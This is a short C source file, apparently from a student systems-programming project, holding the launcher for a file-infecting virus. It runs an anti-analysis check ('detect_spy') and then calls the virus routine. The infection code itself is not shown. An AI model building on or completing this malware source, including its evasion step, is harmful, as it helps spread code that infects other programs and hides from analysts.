/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   start.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
/*   Updated: 2020/02/22 23:16:19 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "syscall.h"
#include "utils.h"
#include "virus.h"
#include "loader.h"

/*
** _start is the launcher function of the virus
**   - it is launched instead of the loader for the first run
**   - it is NOT copied into infected files (unlike the loader and virus)
*/

void	_start(void)
{
	if (detect_spy())
		sys_exit(putstr("spy detected!\n"));

	virus();

	sys_exit(0);
	__builtin_unreachable();
}
